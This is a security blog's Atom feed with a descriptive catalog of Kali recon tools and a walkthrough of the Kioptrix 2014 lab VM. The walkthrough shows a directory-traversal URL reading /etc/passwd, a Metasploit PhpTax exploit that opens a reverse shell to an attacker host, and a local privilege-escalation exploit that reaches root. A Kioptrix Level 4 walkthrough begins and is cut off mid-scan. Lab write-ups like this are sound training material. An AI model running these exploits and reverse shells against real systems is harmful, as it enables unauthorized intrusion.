<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: security | Core dump overflow]]></title>
  <link href="http://chousensha.github.io/blog/categories/security/atom.xml" rel="self"/>
  <link href="http://chousensha.github.io/"/>
  <updated>2014-07-27T23:08:09+03:00</updated>
  <id>http://chousensha.github.io/</id>
  <author>
    <name><![CDATA[chousensha]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Kali tools catalog - Information Gathering]]></title>
    <link href="http://chousensha.github.io/blog/2014/07/17/kali-tools-catalog-information-gathering/"/>
    <updated>2014-07-17T21:25:37+03:00</updated>
    <id>http://chousensha.github.io/blog/2014/07/17/kali-tools-catalog-information-gathering</id>
    <content type="html"><![CDATA[<p>Kali is an awesome distribution for pentesting. But with so many choices, one may find it daunting to find a specific tool for a task without having used it before. Or maybe you&rsquo;re wondering about some tools but don&rsquo;t feel like testing every single one. So I decided to briefly go over the tools provided by Kali and provide a quick description. Where available, I will use the ones presented on their respective websites / manpages etc.</p>

<p>So, let&rsquo;s begin!</p>

<!-- more -->


<h3>DNS Analysis</h3>

<p><strong>dnsdict6</strong></p>

<p>Enumerates a domain for DNS entries, it uses a dictionary file if supplied or a built-in list otherwise. This tool is based on dnsmap by gnucitizen.org.</p>

<p><strong>dnsenum</strong></p>

<p>Multithreaded perl script to enumerate DNS information of a domain and to discover non-contiguous ip blocks.</p>

<p><strong>dnsmap</strong></p>

<p>dnsmap is mainly meant to be used by pentesters during the informatio ngathering/enumeration phase of infrastructure security assessments. During the enumeration stage, the security consultant would typically discover the target company&rsquo;s IP netblocks, domain names, phone numbers, etc &hellip;</p>

<p>Subdomain brute-forcing is another technique that should be used in the enumeration stage, as it&rsquo;s especially useful when other domain enumeration techniques such as zone transfers don&rsquo;t work (I rarely see zone transfers being <em>publicly</em> allowed these days by the way).</p>

<p><strong>dnsrecon</strong></p>

<p>DNS Enumueration and Scanning Tool</p>

<p>The script will perform the following:</p>

<p>Standard  Record  Enumeration for a given domain (A, NS, SOA and MX).</p>

<p>Top Leven Domain Expansion for a given domain.</p>

<p>Zone Transfer against all  NS records of a given domain.</p>

<p>Reverse Lookup against a given IP Range given a start and end IP.</p>

<p>SRV Record enumeration</p>

<p>Brute force hostnames and subdomains of a given target domain  using  a wordlist.</p>

<p><strong>dnsrevenum6</strong></p>

<p>Performs a fast reverse DNS enumeration and is able to cope with slow servers.</p>

<p><strong>dnstracer</strong></p>

<p>Determines where a given Domain Name Server (DNS) gets its information from, and follows the chain of DNS servers back to the servers which know the data.</p>

<p><strong>dnswalk</strong></p>

<p>DNS  debugger.  It performs zone transfers of specified domains, and checks the database in numerous ways for internal  consistency,  as well as for correctness according to accepted practices with the Domain Name System.</p>

<p><strong>fierce</strong></p>

<p>Fierce is a semi-lightweight scanner that helps locate non-contiguous
IP space and hostnames against specified domains.  It&rsquo;s really meant
as a pre-cursor to nmap, unicornscan, nessus, nikto, etc, since all
of those require that you already know what IP space you are looking
for.  This does not perform exploitation and does not scan the whole
internet indiscriminately.  It is meant specifically to locate likely
targets both inside and outside a corporate network.  Because it uses
DNS primarily you will often find mis-configured networks that leak
internal address space. That&rsquo;s especially useful in targeted malware.</p>

<p><strong>urlcrazy</strong></p>

<p>Generate and test domain typos and variations to detect and perform typo squatting, URL hijacking,
phishing, and corporate espionage.</p>

<h3>IDS/IPS Identification</h3>

<p><strong>fragroute</strong></p>

<p>intercept, modify, and rewrite egress traffic</p>

<p><strong>fragrouter</strong></p>

<p>network intrusion detection evasion toolkit</p>

<p><strong>ftest</strong></p>

<p>FTester is a tool designed for testing firewalls filtering policies and Intrusion Detection System (IDS) capabilities.</p>

<p><strong>lbd</strong></p>

<p>load balancing detector &ndash; Checks if a given domain uses load-balancing</p>

<p><strong>wafw00f</strong></p>

<p>Web Application Firewall Detection Tool</p>

<h3>Live Host Identification</h3>

<p><strong>alive6</strong></p>

<p>an effective alive scanner, which will detect all systems listening to this address</p>

<p><strong>arping</strong></p>

<p>sends ARP and/or ICMP requests to the specified host and  displays  the  replies.</p>

<p><strong>cdpsnarf</strong></p>

<p>Cisco Discovery Protocol Sniffer</p>

<p>CDPSnarf is a network sniffer exclusively written to extract
information from CDP packets.
It provides all the information a &ldquo;show cdp neighbors detail&rdquo;
command would return on a Cisco router and even more.</p>

<p><strong>detect-new-ip6</strong></p>

<p>This tool detects new IPv6 addresses joining the local network.</p>

<p><strong>detect_sniffer6</strong></p>

<p>Tests if systems on the local LAN are sniffing.
Works against Windows, Linux, OS/X and *BSD
If no target is given, the link-local-all-nodes address is used, which
however not always works.</p>

<p><strong>dmitry</strong></p>

<p>DMitry (Deepmagic Information Gathering Tool) is a UNIX/(GNU)Linux command line application with the ability to gather as much information as possible about a host.</p>

<p>Basic  functionality  of  DMitry  allows for information to be gathered
about a target host from a simple whois lookup on the target to  uptime
reports and TCP portscans.</p>

<p>The application is considered a tool to assist in information gathering
when information is required quickly by removing the need to enter multiple  commands  and  the timely process of searching through data from multiple sources.</p>

<p><strong>dnmap-client</strong> &amp; <strong>dnmap-server</strong></p>

<p>dnmap is a framework to distribute nmap scans among several clients. It reads an already created file with nmap commands and send those commands to each client connected to it. The framework use a client/server architecture. The server knows what to do and the clients do it. All the logic and statistics are managed in the server. Nmap output is stored on both server and client. Usually you would want this if you have to scan a large group of hosts and you have several different internet connections (or friends that want to help you)</p>

<p><strong>fping</strong></p>

<p>send ICMP ECHO_REQUEST packets to network hosts</p>

<p><strong>hping3</strong></p>

<p>hping3 is a network tool able to send custom TCP/IP packets and to display target replies like ping program does with  ICMP  replies.  hping3 handle  fragmentation,  arbitrary packets body and size and can be used in order to transfer  files  encapsulated  under  supported  protocols.
Using hping3 you are able to perform at least the following stuff:</p>

<ul>
<li>Test firewall rules</li>
<li>Advanced port scanning</li>
<li>Test net performance using different protocols, packet size, TOS (type of service) and fragmentation.</li>
<li>Path MTU discovery</li>
<li>Transferring files between even really fascist firewall rules.</li>
<li>Traceroute-like under different protocols.</li>
<li>Firewalk-like usage.</li>
<li>Remote OS fingerprinting.</li>
<li>TCP/IP stack auditing.</li>
<li>A lot of others.</li>
</ul>


<p><strong>inverse_lookup6</strong></p>

<p>Performs an inverse address query, to get the IPv6 addresses that are assigned
to a MAC address. Note that only few systems support this yet.</p>

<p><strong>miranda</strong></p>

<p>Miranda can discover UPnP hosts either passively or actively, and all of a host’s reported devices types, services, actions and variables can be enumerated with a single command.</p>

<p><strong>ncat</strong></p>

<p>Ncat is a feature-packed networking utility which reads and writes data
across networks from the command line. Ncat was written for the Nmap
Project and is the culmination of the currently splintered family of
Netcat incarnations. It is designed to be a reliable back-end tool to
instantly provide network connectivity to other applications and users.
Ncat will not only work with IPv4 and IPv6 but provides the user with a
virtually limitless number of potential uses.</p>

<p>Among Ncat&rsquo;s vast number of features there is the ability to chain
Ncats together; redirection of TCP, UDP, and SCTP ports to other sites;
SSL support; and proxy connections via SOCKS4 or HTTP proxies (with
optional proxy authentication as well).</p>

<p><strong>netdiscover</strong></p>

<p>an active/passive arp reconnaissance tool.</p>

<p><strong>passive_discovery6</strong></p>

<p>Passivly sniffs the network and dump all client&rsquo;s IPv6 addresses detected.</p>

<p><strong>thcping6</strong></p>

<p>Craft a ICMPv6/TCP/UDP packet with special IPv6 or EH header options.</p>

<p><strong>wol-e</strong></p>

<p>WOL-E is a suite of tools for the Wake on LAN feature of network attached computers, this is now enabled by default on many Apple computers. These tools include:</p>

<p>Bruteforcing the MAC address to wake up clients
Sniffing WOL attempts on the network and saving them to disk
Sniffing WOL passwords on the network and saving them to disk
Waking up single clients (post sniffing attack)
Scanning for Apple devices on the network for WOL enabling
Sending bulk WOL requests to all detected Apple clients.</p>

<p><strong>xprobe2</strong></p>

<p>xprobe2 is an active operating system fingerprinting tool with  a  different  approach  to operating system fingerprinting. xprobe2 relies on fuzzy  signature  matching,  probabilistic  guesses,  multiple  matches simultaneously, and a signature database.</p>

<h3>Network Scanners</h3>

<p><strong>nmap</strong></p>

<p>Nmap (“Network Mapper”) is an open source tool for network exploration
and security auditing. It was designed to rapidly scan large networks,
although it works fine against single hosts. Nmap uses raw IP packets
in novel ways to determine what hosts are available on the network,
what services (application name and version) those hosts are offering,
what operating systems (and OS versions) they are running, what type of
packet filters/firewalls are in use, and dozens of other
characteristics. While Nmap is commonly used for security audits, many
systems and network administrators find it useful for routine tasks
such as network inventory, managing service upgrade schedules, and
monitoring host or service uptime.</p>

<p><strong>unicornscan</strong></p>

<p>asynchronous network stimulus delivery/response recoring tool.</p>

<p><strong>zenmap</strong></p>

<p>Zenmap is a multi-platform graphical Nmap frontend and results viewer.
Zenmap aims to make Nmap easy for beginners to use while giving
experienced Nmap users advanced features. Frequently used scans can be
saved as profiles to make them easy to run repeatedly. A command
creator allows interactive creation of Nmap command lines. Scan results
can be saved and viewed later. Saved scan results can be compared with
one another to see how they differ. The results of recent scans are
stored in a searchable database.</p>

<h3>OS Fingerprinting</h3>

<p>Covered in the above</p>

<h3>OSINT Analysis</h3>

<p><strong>casefile</strong></p>

<p>CaseFile is the little brother to Maltego. It targets a unique market of &lsquo;offline&rsquo; analysts whose primary sources of information are not gained from the open-source intelligence side or can be programmatically queried. We see these people as investigators and analysts who are working &lsquo;on the ground&rsquo;, getting intelligence from other people in the team and building up an information map of their investigation.</p>

<p>CaseFile gives you the ability to quickly add, link and analyze data having the same graphing flexibility and performance as Maltego without the use of transforms.</p>

<p><strong>creepy</strong></p>

<p>creepy  is an application that allows you to gather geolocation related
information about users from  social  networking  platforms  and  image
hosting  services.  The  information  is  presented in a map inside the
application where all the retrieved data is shown accompanied with relevant information (i.e. what was posted from that specific location) to
provide context to the presentation.</p>

<p><img class="center" src="/images/creepy.png" title="&lsquo;creepy&rsquo; &lsquo;creepy&rsquo;" ></p>

<p><strong>jigsaw</strong></p>

<p>Email harvesting, can search on jigsaw.com</p>

<p><strong>maltego</strong></p>

<p>Maltego is a program that can be used to determine the relationships and real world links between:</p>

<p>People</p>

<p>Groups of people (social networks)</p>

<p>Companies</p>

<p>Organizations</p>

<p>Web sites</p>

<p>Internet infrastructure such as:</p>

<p>Domains</p>

<p>DNS names</p>

<p>Netblocks</p>

<p>IP addresses</p>

<p>Phrases</p>

<p>Affiliations</p>

<p>Documents and files</p>

<p>These entities are linked using open source intelligence.</p>

<p><strong>metagoofil</strong></p>

<p>Metagoofil is an information gathering tool designed for extracting metadata of public documents (pdf,doc,xls,ppt,docx,pptx,xlsx) belonging to a target company.</p>

<p>Metagoofil will perform a search in Google to identify and download the documents to local disk and then will extract the metadata with different libraries like Hachoir, PdfMiner? and others. With the results it will generate a report with usernames, software versions and servers or machine names that will help Penetration testers in the information gathering phase.</p>

<p><strong>recon-ng</strong></p>

<p>Recon-ng is a full-featured Web Reconnaissance framework written in Python. Complete with independent modules, database interaction, built in convenience functions, interactive help, and command completion, Recon-ng provides a powerful environment in which open source web-based reconnaissance can be conducted quickly and thoroughly.</p>

<p><strong>theharvester</strong></p>

<p>The objective of this program is to gather emails, subdomains, hosts, employee names, open ports and banners from different public sources like search engines, PGP key servers and SHODAN computer database.</p>

<p><strong>twofi</strong></p>

<p>Twitter Words Of Interest</p>

<p>Build a custom wordlist based on Twitter keywords</p>

<h3>Route analysis</h3>

<p><strong>0trace</strong></p>

<p>Trace route to target</p>

<p><strong>intrace</strong></p>

<p>InTrace is a traceroute-like application that enables users to enumerate IP hops exploiting existing TCP connections, both initiated from local network (local system) or from remote hosts.</p>

<p><strong>netmask</strong></p>

<p>This  program  accepts and produces a variety of common network address
and netmask formats.  Not only can it convert address and netmask notations,  but it will optimize the masks to generate the smallest list of
rules.  This is very handy if you&rsquo;ve  ever  configured  a  firewall  or
router  and  some  nasty  network administrator before you decided that
base 10 numbers were good places to start and end groups of machines.</p>

<p><strong>trace6</strong></p>

<p>A basic but very fast traceroute6 program.
If no port is specified, ICMP6 Ping requests are used, otherwise TCP SYN
packets to the specified port.</p>

<h3>Service Fingerprinting</h3>

<p><strong>implementation6</strong></p>

<p>Performs some IPv6 implementation checks, can be used to test some
firewall features too. Takes approx. 2 minutes to complete.</p>

<p><strong>implementation6d</strong></p>

<p>Identifies test packets by the implementation6 tool, useful to check what
packets passed a firewall</p>

<p><strong>sslscan</strong></p>

<p>SSLScan is a fast SSL port scanner. SSLScan connects to SSL
ports and determines what  ciphers are supported, which are
the servers  preferred  ciphers,  which  SSL  protocols  are
supported  and   returns  the   SSL   certificate.   Client
certificates /  private key can be configured and output is
to text / XML.</p>

<p><strong>sslyze</strong></p>

<p>SSLyze is a Python tool that can analyze the SSL configuration of a server by connecting to it. It is designed to be fast and comprehensive, and should help organizations and testers identify misconfigurations affecting their SSL servers.</p>

<p><strong>tlssled</strong></p>

<p>ssl tls scanner</p>

<h3>SMB Analysis</h3>

<p><strong>acccheck</strong></p>

<p>Attempts to connect to the IPC$ and ADMIN$ shares depending on which flags have been
chosen, and tries a combination of usernames and passwords in the hope to identify
the password to a given account via a dictionary password guessing attack.</p>

<p><strong>nbtscan</strong></p>

<p>nbtscan is a program for scanning IP networks for NetBIOS name information.  It  sends NetBIOS status query to each address in supplied range and lists  received  information  in  human  readable  form.  For  each responded  host  it  lists IP address, NetBIOS computer name, logged-in user name and MAC address (such as Ethernet).</p>

<h3>SMTP Analysis</h3>

<p><strong>smtp-user-enum</strong></p>

<p>Username guessing tool primarily for use against the default Solaris SMTP service. Can use either EXPN, VRFY or RCPT TO</p>

<p><strong>swaks</strong></p>

<p>swaks' primary design goal is to be a flexible, scriptable,
transaction-oriented SMTP test tool.  It handles SMTP features and
extensions such as TLS, authentication, and pipelining; multiple
version of the SMTP protocol including SMTP, ESMTP, and LMTP; and
multiple transport methods including unix-domain sockets, internet-
domain sockets, and pipes to spawned processes.  Options can be
specified in environment variables, configuration files, and the
command line allowing maximum configurability and ease of use for
operators and scripters.</p>

<h3>SNMP Analysis</h3>

<p><strong>braa</strong></p>

<p>Braa is a tool for making SNMP queries. It is able to query hundreds or thousands of hosts simultaneously, while being completely single-threaded. It does not need any SNMP libraries, as it is equipped with its own SNMP engine</p>

<p><strong>cisco-auditing-tool</strong></p>

<p>Perl script which scans cisco routers for common vulnerabilities. Checks for default passwords, easily guessable community names, and the IOS history bug. Includes support for plugins and scanning multiple hosts.</p>

<p><strong>cisco-torch</strong></p>

<p>mass scanning, application layer fingerprinting, and exploitation tool to discover and attack remote Cisco hosts running Telnet, SSH, Web, TFTP, NTP and SNMP services. Useful in auditing large networks for misconfigured/un-updated Ciscos.</p>

<p><strong>copy-router-config</strong></p>

<p>copy an entire router configuration file from a Cisco device</p>

<p><strong>merge-router-config</strong></p>

<p>make changes to a Cisco router configuration file and merge those changes to a Cisco router</p>

<p><strong>onesixtyone</strong></p>

<p>simple SNMP scanner which sends requests for the  sys‐Descr value asynchronously with user-adjustable sending times.</p>

<p><strong>snmpcheck</strong></p>

<p>SNMP device enumerator</p>

<h3>SSL Analysis</h3>

<p><strong>sslcaudit</strong></p>

<p>This tool is designed to automate testing SSL/TLS clients for resistance against MITM attacks</p>

<p><strong>ssldump</strong></p>

<p>ssldump is an SSL/TLS network protocol analyzer. It identifies TCP connections on the chosen network interface and attempts to interpret them as  SSL/TLS traffic. When it identifies SSL/TLS traffic, it decodes the records and displays them in a textual form to stdout. If provided with the  appropriate  keying material, it will also decrypt the connections and display the application data traffic.</p>

<p><strong>sslh</strong></p>

<p>ssl/ssh multiplexer</p>

<p><strong>sslsniff</strong></p>

<p>sslsniff  is  designed  to  create man-in-the-middle (MITM) attacks for
SSL/TLS connections, and dynamically generates certs  for  the  domains
that  are  being  accessed  on  the  fly. The new certificates are constructed in a certificate chain that is signed by any certificate  that is provided.
sslsniff  also  supports other attacks like null-prefix or OCSP attacks
to achieve silent interceptions of connections when possible.</p>

<p><strong>sslsplit</strong></p>

<p>SSLsplit  is  a  tool  for  man-in-the-middle  attacks  against SSL/TLS
encrypted network connections.  Connections  are  transparently  intercepted  through  a network address translation engine and redirected to
SSLsplit.  SSLsplit terminates SSL/TLS and initiates a new SSL/TLS connection  to  the  original  destination address, while logging all data
transmitted.  SSLsplit is intended to be useful for  network  forensics
and penetration testing.</p>

<p><strong>sslstrip</strong></p>

<p>SSL/TLS man-in-the-middle attack tool</p>

<p><strong>stunnel</strong></p>

<p>The stunnel program is designed to work as SSL encryption wrapper
between remote clients and local (inetd-startable) or remote servers.
The concept is that having non-SSL aware daemons running on your system
you can easily set them up to communicate with clients over secure SSL channels.</p>

<h3>Telephony Analysis</h3>

<p><strong>ace</strong></p>

<p>Automated Corporate (Data) Enumerator</p>

<h3>Traffic Analysis</h3>

<p><strong>irpas-ass</strong></p>

<p>Autonomous System Scanner</p>

<p><strong>irpass-cdp</strong></p>

<p>This program is for sending CDP (Cisco router Discovery Protocol) messages to the wire.</p>

<p><strong>p0f</strong></p>

<p>P0f is a tool that utilizes an array of sophisticated, purely passive traffic
fingerprinting mechanisms to identify the players behind any incidental TCP/IP
communications (often as little as a single normal SYN) without interfering in
any way.</p>

<p>Some of its capabilities include:</p>

<ul>
<li><p>Highly scalable and extremely fast identification of the operating system
and software on both endpoints of a vanilla TCP connection &ndash; especially in
settings where NMap probes are blocked, too slow, unreliable, or would
simply set off alarms,</p></li>
<li><p>Measurement of system uptime and network hookup, distance (including
topology behind NAT or packet filters), and so on.</p></li>
<li><p>Automated detection of connection sharing / NAT, load balancing, and
application-level proxying setups.</p></li>
<li><p>Detection of dishonest clients / servers that forge declarative statements
such as X-Mailer or User-Agent.</p></li>
</ul>


<p><strong>tcpflow</strong></p>

<p>tcpflow is a program that captures data transmitted as part of TCP connections (flows), and stores the data in a way that is convenient for protocol analysis or debugging.</p>

<p><strong>wireshark</strong></p>

<p>Wireshark is a GUI network protocol analyzer.  It lets you
interactively browse packet data from a live network or from a
previously saved capture file.</p>

<h3>VoIP Analysis</h3>

<p><strong>enumiax</strong></p>

<p>enumIAX is an Inter Asterisk Exchange version 2 (IAX2) protocol username brute-force enumerator.</p>

<h3>VPN Analysis</h3>

<p><strong>ike-scan</strong></p>

<p>Discover and fingerprint IKE hosts (IPsec VPN servers)</p>

<p>Ok, that took forever. I will make posts with the other categories as well.</p>

<blockquote><p>The only way to keep your health is to eat what you don&rsquo;t want, drink what
you don&rsquo;t like, and do what you&rsquo;d rather not.</p>

<p>&mdash; Mark Twain</p></blockquote>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Kioptrix 2014]]></title>
    <link href="http://chousensha.github.io/blog/2014/06/27/kioptrix-2014/"/>
    <updated>2014-06-27T19:01:09+03:00</updated>
    <id>http://chousensha.github.io/blog/2014/06/27/kioptrix-2014</id>
    <content type="html"><![CDATA[<p>Right when I thought I was finished with the Kioptrix vulnerable machines, I discovered there is a new addition to the series! This is great, because I really enjoyed the Kioptrix challenges! So let&rsquo;s dive in!</p>

<!-- more -->


<p>First, if you have problems with booting it up, check out the fix and instructions from <a href="http://vulnhub.com/entry/kioptrix_2014-5,62/">http://vulnhub.com/entry/kioptrix_2014-5,62/</a></p>

<p>Let&rsquo;s fire Nmap:</p>

<p>``` plain
nmap -A -p1-65535 192.168.127.130</p>

<p>Starting Nmap 6.46 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2014-06-27 19:14 EEST
Nmap scan report for 192.168.127.130
Host is up (0.0031s latency).
Not shown: 65532 filtered ports
PORT     STATE  SERVICE VERSION
22/tcp   closed ssh
80/tcp   open   http    Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)
| http-methods: Potentially risky methods: TRACE
|<em>See <a href="http://nmap.org/nsedoc/scripts/http-methods.html">http://nmap.org/nsedoc/scripts/http-methods.html</a>
|</em>http-title: Site doesn&rsquo;t have a title (text/html).
8080/tcp open   http    Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)
|<em>http-methods: No Allow or Public header in OPTIONS response (status code 403)
|</em>http-title: 403 Forbidden
MAC Address: 00:0C:29:BB:7C:98 (VMware)
Device type: general purpose
Running: FreeBSD 7.X|8.X|9.X
OS CPE: cpe:/o:freebsd:freebsd:7 cpe:/o:freebsd:freebsd:8 cpe:/o:freebsd:freebsd:9
OS details: FreeBSD 7.0-RELEASE &ndash; 9.0-RELEASE
```</p>

<p>Next I used the browser to check what is being hosted on ports 80 and 8080. On port 80 there is just an &ldquo;It works!&rdquo; message, and on port 8080 I got the Forbidden message. But on port 80&rsquo;s page source code, there is a comment revealing additional functionality:</p>

<p><code>html
&lt;META HTTP-EQUIV="refresh" CONTENT="5;URL=pChart2.1.3/index.php"&gt;
</code></p>

<p><img class="center" src="/images/pchart.png" title="&lsquo;pchart&rsquo; &lsquo;pchart&rsquo;" ></p>

<p>Searching for pChart reveals that this version is affected by <a href="http://www.exploit-db.com/exploits/31173/">directory traversal and XSS</a></p>

<p>So we can read any file that the web server is sufficiently privileged to read with the following string:</p>

<p><code>plain
http://192.168.127.130/pChart2.1.3/examples/index.php?Action=View&amp;Script=/../../etc/passwd
</code></p>

<p>In this case, there wasn&rsquo;t much information that could be of further use, and I wasn&rsquo;t able to read /etc/shadow, which was to be expected. Fortunately, the Apache configuration file is helpful. Since this is a FreeBSD system, the file is located in <code>/usr/local/etc/apache2x/httpd.conf</code> , <em>x</em> being the version number. At the moment, the only thing I could find interesting was this part at the very end of the file:</p>

<p>``` plain
SetEnvIf User-Agent ^Mozilla/4.0 Mozilla4_browser</p>

<p><VirtualHost *:8080></p>

<pre><code>DocumentRoot /usr/local/www/apache22/data2
</code></pre>

<p><Directory "/usr/local/www/apache22/data2"></p>

<pre><code>Options Indexes FollowSymLinks
AllowOverride All
Order allow,deny
Allow from env=Mozilla4_browser
</code></pre>

<p></Directory>
```</p>

<p>So it appears that a certain user agent receives special treatment! Let&rsquo;s verify this by changing the UA (I used the User Agent Switcher add-on for Firefox). And when I went to <a href="http://192.168.127.130:8080/">http://192.168.127.130:8080/</a> , there was a directory index for something called phptax! No more forbidden errors!</p>

<p><img class="center" src="/images/phptax.png" title="&lsquo;phptax&rsquo; &lsquo;phptax&rsquo;" ></p>

<p>So, <a href="http://sourceforge.net/projects/phptax/">the program</a> is used to generate PDFs. The good news (for us, not for the dilligent tax payers) is that it&rsquo;s <a href="http://www.exploit-db.com/exploits/21665/">vulnerable to remote code execution</a>, and there&rsquo;s also a Metasploit module available for it:</p>

<p><strong>PhpTax pfilez Parameter Exec Remote Code Injection</strong></p>

<blockquote><p>This module exploits a vulnerability found in PhpTax, an income tax report
generator. When generating a PDF, the icondrawpng() function in drawimage.php does
not properly handle the pfilez parameter, which will be used in a exec() statement,
and then results in arbitrary remote code execution
under the context of the web  server. Please note: authentication is not required to exploit this vulnerability.</p></blockquote>

<p>``` plain
msf > use exploit/multi/http/phptax_exec
msf exploit(phptax_exec) > show options</p>

<p>Module options (exploit/multi/http/phptax_exec):</p>

<p>   Name       Current Setting  Required  Description</p>

<hr />

<p>   Proxies                     no        Use a proxy chain
   RHOST                       yes       The target address
   RPORT      80               yes       The target port
   TARGETURI  /phptax/         yes       The path to the web application
   VHOST                       no        HTTP server virtual host</p>

<p>Exploit target:</p>

<p>   Id  Name</p>

<hr />

<p>   0   PhpTax 0.8</p>

<p>msf exploit(phptax_exec) > set RHOST 192.168.127.130
RHOST => 192.168.127.130
msf exploit(phptax_exec) > set RPORT 8080
RPORT => 8080
msf exploit(phptax_exec) > set payload cmd/unix/reverse
payload => cmd/unix/reverse
msf exploit(phptax_exec) > set LHOST 192.168.127.159
LHOST => 192.168.127.159
msf exploit(phptax_exec) > exploit</p>

<p>[<em>] Started reverse double handler
[</em>] 192.168.127.1308080 &ndash; Sending request&hellip;
[<em>] Accepted the first client connection&hellip;
[</em>] Accepted the second client connection&hellip;
[<em>] Command: echo ROZVUxzhMsI70Nsb;
[</em>] Writing to socket A
[<em>] Writing to socket B
[</em>] Reading from sockets&hellip;
[<em>] Reading from socket B
[</em>] B: &ldquo;ROZVUxzhMsI70Nsb\r\n&rdquo;
[<em>] Matching&hellip;
[</em>] A is input&hellip;
[<em>] Accepted the first client connection&hellip;
[</em>] Accepted the second client connection&hellip;
[<em>] Command: echo D6E80V1rZ169oQA6;
[</em>] Writing to socket A
[<em>] Writing to socket B
[</em>] Reading from sockets&hellip;
[<em>] Reading from socket A
[</em>] A: &ldquo;D6E80V1rZ169oQA6\r\n&rdquo;
[<em>] Matching&hellip;
[</em>] B is input&hellip;</p>

<p>whoami
www
```</p>

<p>We managed to break through. Now let&rsquo;s see how we can become root. I used <a href="http://www.exploit-db.com/exploits/26368/">this mmap/ptrace exploit</a></p>

<p>I downloaded it to my machine and served it on netcat, than I connected from the victim to the attacker machine and saved the file to the /tmp directory. From there, it was a matter of compiling it and running it:</p>

<p><code>plain
gcc -o exploit 26368.c
chmod a+x exploit
./exploit
whoami
root
</code></p>

<p>In the /root directory, there&rsquo;s another congrats.txt from loneferret:</p>

<p>``` plain
cat congrats.txt
If you are reading this, it means you got root (or cheated).
Congratulations either way&hellip;</p>

<p>Hope you enjoyed this new VM of mine. As always, they are made for the beginner in
mind, and not meant for the seasoned pentester. However this does not mean one
can&rsquo;t enjoy them.</p>

<p>As with all my VMs, besides getting &ldquo;root&rdquo; on the system, the goal is to also
learn the basics skills needed to compromise a system. Most importantly, in my mind,
are information gathering &amp; research. Anyone can throw massive amounts of exploits
and &ldquo;hope&rdquo; it works, but think about the traffic.. the logs&hellip; Best to take it
slow, and read up on the information you gathered and hopefully craft better
more targetted attacks.</p>

<p>For example, this system is FreeBSD 9. Hopefully you noticed this rather quickly.
Knowing the OS gives you any idea of what will work and what won&rsquo;t from the get go.
Default file locations are not the same on FreeBSD versus a Linux based distribution.
Apache logs aren&rsquo;t in &ldquo;/var/log/apache/access.log&rdquo;, but in &ldquo;/var/log/httpd-access.log&rdquo;.
It&rsquo;s default document root is not &ldquo;/var/www/&rdquo; but in &ldquo;/usr/local/www/apache22/data&rdquo;.
Finding and knowing these little details will greatly help during an attack. Of course
my examples are specific for this target, but the theory applies to all systems.</p>

<p>As a small exercise, look at the logs and see how much noise you generated. Of course
the log results may not be accurate if you created a snapshot and reverted, but at least
it will give you an idea. For fun, I installed &ldquo;OSSEC-HIDS&rdquo; and monitored a few things.
Default settings, nothing fancy but it should&rsquo;ve logged a few of your attacks. Look
at the following files:
/root/folderMonitor.log
/root/httpd-access.log (softlink)
/root/ossec-alerts.log (softlink)</p>

<p>The folderMonitor.log file is just a cheap script of mine to track created/deleted and modified
files in 2 specific folders. Since FreeBSD doesn&rsquo;t support &ldquo;iNotify&rdquo;, I couldn&rsquo;t use OSSEC-HIDS
for this.
The httpd-access.log is rather self-explanatory .
Lastly, the ossec-alerts.log file is OSSEC-HIDS is where it puts alerts when monitoring certain
files. This one should&rsquo;ve detected a few of your web attacks.</p>

<p>Feel free to explore the system and other log files to see how noisy, or silent, you were.
And again, thank you for taking the time to download and play.
Sincerely hope you enjoyed yourself.</p>

<p>Be good&hellip;</p>

<p>loneferret
<a href="http://www.kioptrix.com">http://www.kioptrix.com</a></p>

<p>p.s.: Keep in mind, for each &ldquo;web attack&rdquo; detected by OSSEC-HIDS, by
default it would&rsquo;ve blocked your IP (both in hosts.allow &amp; Firewall) for
600 seconds. I was nice enough to remove that part :)
```</p>

<p>This concludes the Kioptrix series, and cheers to <strong>loneferret</strong> for creating these awesome challenges!</p>

<blockquote><p>Today is the first day of the rest of the mess.</p></blockquote>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pentest lab - Kioptrix Level 4]]></title>
    <link href="http://chousensha.github.io/blog/2014/06/22/pentest-lab-kioptrix-level-4/"/>
    <updated>2014-06-22T22:39:14+03:00</updated>
    <id>http://chousensha.github.io/blog/2014/06/22/pentest-lab-kioptrix-level-4</id>
    <content type="html"><![CDATA[<p>This is the final vulnerable machine in the Kioptrix series. To set it up in VMware, create a new virtual machine with the advanced options and use existing virtual disk, pointing it at the Kioptrix 4 virtual disk.</p>

<!-- more -->


<p>Let&rsquo;s see what Nmap reveals:</p>

<p>``` plain
nmap -A -p1-65535 192.168.127.129</p>

<p>Starting Nmap 6.46 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2014-06-22 22:35 EEST
Nmap scan report for 192.168.127.129
Host is up (0.00074s latency).
Not shown: 39528 closed ports, 26003 filtered ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
| ssh-hostkey:
|   1024 9b:ad:4f:f2:1e:c5:f2:39:14:b9:d3:a0:0b:e8:41:71 (DSA)
|<em>  2048 85:40:c6:d5:41:26:05:34:ad:f8:6e:f2:a7:6b:4f:0e (RSA)
80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
|</em>http-methods: No Allow or Public header in OPTIONS response (status code 200)
|_http-title: Site doesn&rsquo;t have a title (text/html).
139/tcp open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
MAC Address: 00:0C:29:1F:12:65 (VMware)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 &ndash; 2.6.33
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</p>

<p>Host script results:
|<em>nbstat: NetBIOS name: KIOPTRIX4, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery:
